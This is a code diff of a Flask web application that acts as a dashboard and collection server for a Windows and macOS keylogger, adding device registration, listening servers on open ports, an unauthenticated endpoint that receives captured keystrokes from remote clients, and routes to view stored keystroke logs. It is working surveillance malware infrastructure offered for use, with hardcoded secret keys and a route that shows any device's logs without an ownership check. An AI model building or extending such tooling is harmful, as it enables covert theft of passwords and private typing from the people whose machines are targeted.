@@ -2,7 +2,7 @@ from flask import Flask, request, jsonify, render_template, url_for, flash, redi
 from flask_login import LoginManager, login_user, login_required, logout_user, current_user
 from datetime import datetime, timedelta
 from config import Config
-from models import User, Post, Log, db, Feature, FAQ, Newsletter, Device
+from models import User, Post, Log, db, Feature, FAQ, Newsletter, Device, KeyLog
 import smtplib, os
 from dotenv import load_dotenv
 from email.mime.text import MIMEText
@@ -21,6 +21,14 @@ import sqlite3
 import platform
 from keylogger.windows_keylogger import KeyLogger as WindowsKeyLogger
 from keylogger.macos_keylogger import KeyLogger as MacKeyLogger
+from flask_wtf.csrf import CSRFProtect
+import uuid
+from sqlalchemy import event
+from sqlalchemy.engine import Engine
+import socket
+import json
+import threading
+from keylogger.remote_server import KeyloggerServer
 
 
 load_dotenv()
@@ -28,44 +36,61 @@ load_dotenv()
 
 app = Flask(__name__)
 app.config.from_object(Config)
+app.config['SECRET_KEY'] = 'dev-key-12345'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///keylogger.db'
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.config['WTF_CSRF_SECRET_KEY'] = 'csrf-key-12345'
+app.config['WTF_CSRF_ENABLED'] = True
+csrf = CSRFProtect(app)
 
 year = datetime.now().year
 
-DATA_FOLDER = os.path.join(os.path.dirname(__file__), 'data')
-if not os.path.exists(DATA_FOLDER):
-    os.makedirs(DATA_FOLDER)
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DATA_DIR = os.path.join(BASE_DIR, 'data')
+DB_PATH = os.path.join(DATA_DIR, 'keylogger.db')
+
+# Make sure the data directory exists
+os.makedirs(DATA_DIR, exist_ok=True)
+
+# Update your Flask SQLAlchemy configuration
+app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_PATH}'
 
 db.init_app(app)
 migrate = Migrate(app, db)
 login_manager = LoginManager()
 login_manager.init_app(app)
 login_manager.login_view = 'login'
+login_manager.login_message = 'Please log in to access this page.'
+
+# Create tables
+with app.app_context():
+    db.create_all()
 
 @login_manager.user_loader
 def load_user(id):
     return User.query.get(int(id))
 
 @app.route('/')
-def home():
-    year = datetime.now().year
-    return render_template('index.html', year=year)
+def index():
+    return render_template('index.html')
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if current_user.is_authenticated:
-        return redirect(url_for('home'))
+        return redirect(url_for('macos'))
     
     if request.method == 'POST':
         email = request.form.get('email')
         password = request.form.get('password')
-        remember = request.form.get('remember') == 'on'  # Check if remember me is checked
+        remember = request.form.get('remember') == 'on'
         
         user = User.query.filter_by(email=email).first()
         if user and user.check_password(password):
-            # Log in user with remember me if checked
-            login_user(user, remember=remember, duration=timedelta(days=30))
+            login_user(user, remember=remember)
             next_page = request.args.get('next')
-            return redirect(next_page or url_for('home'))
+            if next_page and next_page.startswith('/'):  # Ensure the next page is relative
+                return redirect(next_page)
+            return redirect(url_for('macos'))
         
         flash('Invalid email or password')
     
@@ -74,34 +99,24 @@ def login():
 @app.route('/signup', methods=['GET', 'POST'])
 def signup():
     if current_user.is_authenticated:
-        return redirect(url_for('home'))
+        return redirect(url_for('macos'))
     
     if request.method == 'POST':
         name = request.form.get('name')
         email = request.form.get('email')
         password = request.form.get('password')
-        password2 = request.form.get('password2')
-
-        if not all([name, email, password, password2]):
-            flash('Please fill all fields')
-            return render_template('signup.html')
-
-        if password != password2:
-            flash('Passwords do not match')
-            return render_template('signup.html')
         
         if User.query.filter_by(email=email).first():
             flash('Email already registered')
             return render_template('signup.html')
-
+        
         user = User(name=name, email=email)
         user.set_password(password)
         db.session.add(user)
         db.session.commit()
-
-        login_user(user)
-        flash('Account created successfully!')
-        return redirect(url_for('home'))
+        
+        flash('Registration successful! Please log in.')
+        return redirect(url_for('login'))
     
     return render_template('signup.html')
 
@@ -109,10 +124,11 @@ def signup():
 @login_required
 def logout():
     logout_user()
-    flash('Logged out successfully.')
-    return redirect(url_for('home'))
+    flash('You have been logged out.')
+    return redirect(url_for('login'))
 
 @app.route('/logs_history')
+@login_required
 def logs_history():
     return render_template('logs_history.html')
 
@@ -120,12 +136,13 @@ def logs_history():
 def features():
     return render_template('features.html')
 
-@app.route('/macos', methods=['GET', 'POST'])
+@app.route('/macos')
 @login_required
 def macos():
     return render_template('macos.html')
 
-@app.route('/windows', methods=['GET', 'POST'])
+@app.route('/windows')
+@login_required
 def windows():
     return render_template('windows.html')
 
@@ -387,23 +404,69 @@ if not app.debug:
     file_handler.setFormatter(formatter)
     app.logger.addHandler(file_handler)
 
+# Add these global variables near the top with other imports
+REMOTE_CONNECTIONS = {}  # Store remote connections {device_id: (host, port)}
+REMOTE_SERVERS = {}     # Store server instances {device_id: server_instance}
+
+def start_remote_server(device_id):
+    # Find an available port (starting from 12345)
+    port = 12345
+    while port < 13345:  # Try up to port 13345
+        try:
+            server = KeyloggerServer(host='0.0.0.0', port=port, db_path=DB_PATH)
+            REMOTE_SERVERS[device_id] = server
+            REMOTE_CONNECTIONS[device_id] = ('0.0.0.0', port)
+            
+            # Start server in a separate thread
+            server_thread = threading.Thread(target=server.start)
+            server_thread.daemon = True
+            server_thread.start()
+            
+            app.logger.info(f"Started remote server for device {device_id} on port {port}")
+            return port
+            
+        except OSError:  # Port in use
+            port += 1
+    
+    raise Exception("No available ports found")
+
 @app.route('/api/register_device', methods=['POST'])
 @login_required
 def register_device():
-    data = request.get_json()
-    device_id = data.get('device_id')
-    name = data.get('name', f'Device-{device_id}')
-    
-    device = Device.query.filter_by(device_id=device_id).first()
-    if not device:
-        device = Device(device_id=device_id, name=name, user_id=current_user.id)
+    try:
+        data = request.get_json()
+        device_type = data.get('type', 'macos')
+        
+        # Generate a new device
+        device = Device(
+            user_id=current_user.id,
+            os_info=device_type,
+            name=f"New {device_type.capitalize()} Device"
+        )
         db.session.add(device)
-    
-    device.last_seen = datetime.utcnow()
-    device.is_active = True
-    db.session.commit()
-    
-    return jsonify({"status": "success"})
+        db.session.commit()
+        
+        if device_type == 'windows':
+            # Start a remote server for this device
+            try:
+                port = start_remote_server(device.device_id)
+                # Get the server's IP address or hostname
+                host = request.host.split(':')[0]  # Remove port if present
+                return jsonify({
+                    'device_id': device.device_id,
+                    'port': port,
+                    'host': host
+                })
+            except Exception as e:
+                db.session.delete(device)
+                db.session.commit()
+                raise Exception(f"Failed to start remote server: {str(e)}")
+        
+        return jsonify({'device_id': device.device_id})
+        
+    except Exception as e:
+        app.logger.error(f"Error registering device: {str(e)}")
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/api/get_target_machines_list')
 @login_required
@@ -438,50 +501,63 @@ def get_keylogger_class():
     else:
         raise NotImplementedError(f"Keylogger not implemented for {system}")
 
+# Add this near your other Flask configurations
+keylogger_instance = None
+
 @app.route('/api/toggle_logging', methods=['POST'])
 @login_required
 def toggle_logging():
-    data = request.get_json()
-    device_id = data.get('device_id')
-    action = data.get('action')
-    
     try:
-        # Only allow operations on devices matching current OS
-        current_os = platform.system().lower()
-        if (current_os == 'windows' and not device_id.startswith('WIN-')) or \
-           (current_os == 'darwin' and not device_id.startswith('MAC-')):
-            return jsonify({
-                "error": "Device type doesn't match current operating system"
-            }), 400
-
-        KeyLoggerClass = get_keylogger_class()
+        data = request.get_json()
+        device_id = data.get('device_id')
+        action = data.get('action')
         
-        if not hasattr(app, 'keyloggers'):
-            app.keyloggers = {}
+        if not device_id or not action:
+            return jsonify({'error': 'Missing device_id or action'}), 400
             
-        if action == 'start':
-            if device_id not in app.keyloggers:
-                db_path = os.path.join(app.instance_path, 'keylogger.db')
-                app.keyloggers[device_id] = KeyLoggerClass(db_path)
+        device = Device.query.filter_by(
+            device_id=device_id,
+            user_id=current_user.id
+        ).first()
+        
+        if not device:
+            return jsonify({'error': 'Device not found'}), 404
             
-            result = app.keyloggers[device_id].start_logging(device_id)
-            device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
-            device.is_active = True
+        if device.os_info == 'windows':
+            # For Windows devices, we just update the status
+            device.is_logging = (action == 'start')
             db.session.commit()
-            return jsonify({"message": result, "is_active": True})
-            
-        elif action == 'stop':
-            if device_id in app.keyloggers:
-                result = app.keyloggers[device_id].stop_logging()
-                device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
-                device.is_active = False
-                db.session.commit()
-                return jsonify({"message": result, "is_active": False})
-            return jsonify({"message": "Keylogger was not running", "is_active": False})
-            
+            return jsonify({
+                'status': 'success',
+                'message': f"Logging {'started' if action == 'start' else 'stopped'} successfully"
+            })
+        else:
+            # Existing macOS logic here
+            if action == 'start':
+                if keylogger_instance is None:
+                    keylogger_instance = KeyLogger(DB_PATH)
+                result = keylogger_instance.start_logging(device_id)
+                if "successfully" in result:
+                    device.is_logging = True
+                    db.session.commit()
+                    return jsonify({'status': 'success', 'message': result})
+                else:
+                    return jsonify({'error': result}), 500
+            elif action == 'stop':
+                if keylogger_instance:
+                    result = keylogger_instance.stop_logging()
+                    device.is_logging = False
+                    db.session.commit()
+                    if "successfully" in result:
+                        return jsonify({'status': 'success', 'message': result})
+                    else:
+                        return jsonify({'error': result}), 500
+                else:
+                    return jsonify({'error': 'Keylogger not initialized'}), 400
+                    
     except Exception as e:
-        app.logger.error(f"Error in toggle_logging: {str(e)}")
-        return jsonify({"error": str(e)}), 500
+        app.logger.error(f"Error toggling logging: {str(e)}")
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/api/device/status', methods=['POST'])
 @login_required
@@ -538,32 +614,52 @@ def get_device_info(device_id):
 @app.route('/api/remove_device', methods=['POST'])
 @login_required
 def remove_device():
-    data = request.get_json()
-    device_id = data.get('device_id')
-    
     try:
-        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
-        if device:
-            # Stop keylogger if running
-            if hasattr(app, 'keyloggers') and device_id in app.keyloggers:
-                app.keyloggers[device_id].stop_logging()
-                del app.keyloggers[device_id]
+        data = request.get_json()
+        device_id = data.get('device_id')
+        
+        if not device_id:
+            return jsonify({'error': 'Missing device_id'}), 400
             
-            # Delete associated keystrokes first
-            conn = sqlite3.connect('instance/keylogger.db')
+        device = Device.query.filter_by(
+            device_id=device_id,
+            user_id=current_user.id
+        ).first()
+        
+        if not device:
+            return jsonify({'error': 'Device not found'}), 404
+            
+        try:
+            # First delete associated keystrokes
+            conn = sqlite3.connect(DB_PATH)
             c = conn.cursor()
-            c.execute('DELETE FROM keystrokes WHERE device_id = ?', (device_id,))
+            c.execute("DELETE FROM keystrokes WHERE device_id = ?", (device_id,))
             conn.commit()
             conn.close()
             
-            # Remove device
+            # Stop remote server if it's a Windows device
+            if device.os_info == 'windows' and device_id in REMOTE_SERVERS:
+                try:
+                    server = REMOTE_SERVERS[device_id]
+                    server.stop()
+                    del REMOTE_SERVERS[device_id]
+                    del REMOTE_CONNECTIONS[device_id]
+                except Exception as e:
+                    app.logger.warning(f"Error stopping remote server: {str(e)}")
+            
+            # Finally delete the device
             db.session.delete(device)
             db.session.commit()
-            return jsonify({"status": "success"})
-        return jsonify({"error": "Device not found"}), 404
+            
+            return jsonify({'status': 'success', 'message': 'Device removed successfully'})
+            
+        except Exception as e:
+            db.session.rollback()
+            raise e
+            
     except Exception as e:
-        app.logger.error(f"Error removing device: {e}")
-        return jsonify({"error": str(e)}), 500
+        app.logger.error(f"Error removing device: {str(e)}")
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/api/get_keystrokes')
 @login_required
@@ -613,7 +709,143 @@ def get_keystrokes():
         app.logger.error(f"Error in get_keystrokes: {str(e)}")
         return jsonify({"error": str(e)}), 500
 
+@app.route('/api/logs/<device_id>')
+@login_required
+def get_logs(device_id):
+    try:
+        device = Device.query.filter_by(device_id=device_id).first()
+        if not device:
+            return jsonify({'error': 'Device not found'}), 404
+            
+        # Connect directly to the database
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("SELECT timestamp, content FROM keystrokes WHERE device_id = ? ORDER BY timestamp DESC",
+                 (device_id,))
+        rows = c.fetchall()
+        conn.close()
+        
+        # Format the logs
+        logs = [f"[{row[0]}] {row[1]}" for row in rows]
+        
+        app.logger.debug(f"Retrieved {len(logs)} logs for device {device_id}")
+        return jsonify(logs)
+        
+    except Exception as e:
+        app.logger.error(f"Error getting logs: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/client/log_keystrokes', methods=['POST'])
+def client_log_keystrokes():
+    try:
+        data = request.get_json()
+        device_id = data.get('device_id')
+        keystrokes = data.get('content')
+        timestamp = data.get('timestamp')
+        
+        if not all([device_id, keystrokes, timestamp]):
+            return jsonify({'error': 'Missing required fields'}), 400
+            
+        log = KeyLog(
+            device_id=device_id,
+            keystrokes=keystrokes,
+            timestamp=datetime.strptime(timestamp, "%Y-%m-%d %H:%M")
+        )
+        db.session.add(log)
+        db.session.commit()
+        
+        return jsonify({'status': 'success'})
+        
+    except Exception as e:
+        db.session.rollback()
+        app.logger.error(f"Error logging keystrokes from client: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+# Add this near your other Flask configurations
+@event.listens_for(Engine, "connect")
+def set_sqlite_pragma(dbapi_connection, connection_record):
+    cursor = dbapi_connection.cursor()
+    cursor.execute("PRAGMA foreign_keys=ON")
+    cursor.close()
+
+@app.route('/api/devices', methods=['GET'])
+@login_required
+def get_devices():
+    device_type = request.args.get('type', 'all')
+    try:
+        query = Device.query.filter_by(user_id=current_user.id)
+        if device_type != 'all':
+            query = query.filter_by(os_info=device_type)
+            
+        devices = query.all()
+        return jsonify([{
+            'id': d.device_id,
+            'name': d.name,
+            'os_info': d.os_info,
+            'is_active': d.is_active,
+            'is_logging': d.is_logging
+        } for d in devices])
+    except Exception as e:
+        app.logger.error(f"Error getting devices: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/toggle_encryption', methods=['POST'])
+@login_required
+def toggle_encryption():
+    try:
+        data = request.get_json()
+        device_id = data.get('device_id')
+
+        if not device_id:
+            return jsonify({'error': 'Missing device_id'}), 400
+
+        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
+        if not device:
+            return jsonify({'error': 'Device not found'}), 404
+
+        # Toggle encryption
+        device.is_encrypted = not device.is_encrypted
+        db.session.commit()
+
+        return jsonify({
+            'status': 'success',
+            'is_encrypted': device.is_encrypted,
+            'message': f'Encryption {"enabled" if device.is_encrypted else "disabled"}'
+        })
+
+    except Exception as e:
+        db.session.rollback()
+        app.logger.error(f"Error toggling encryption: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/log_keystrokes', methods=['POST'])
+@login_required
+def log_keystrokes():
+    try:
+        data = request.get_json()
+        device_id = data.get('device_id')
+        keystrokes = data.get('keystrokes')
+        
+        if not device_id or not keystrokes:
+            return jsonify({'error': 'Missing device_id or keystrokes'}), 400
+            
+        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
+        if not device:
+            return jsonify({'error': 'Device not found'}), 404
+            
+        if not device.is_logging:
+            return jsonify({'error': 'Logging is not enabled for this device'}), 400
+            
+        log = KeyLog(device_id=device_id, keystrokes=keystrokes)
+        db.session.add(log)
+        db.session.commit()
+        
+        return jsonify({'status': 'success'})
+        
+    except Exception as e:
+        db.session.rollback()
+        app.logger.error(f"Error logging keystrokes: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
 if __name__ == '__main__':
-    with app.app_context():
-        db.create_all()
     app.run(debug=True)
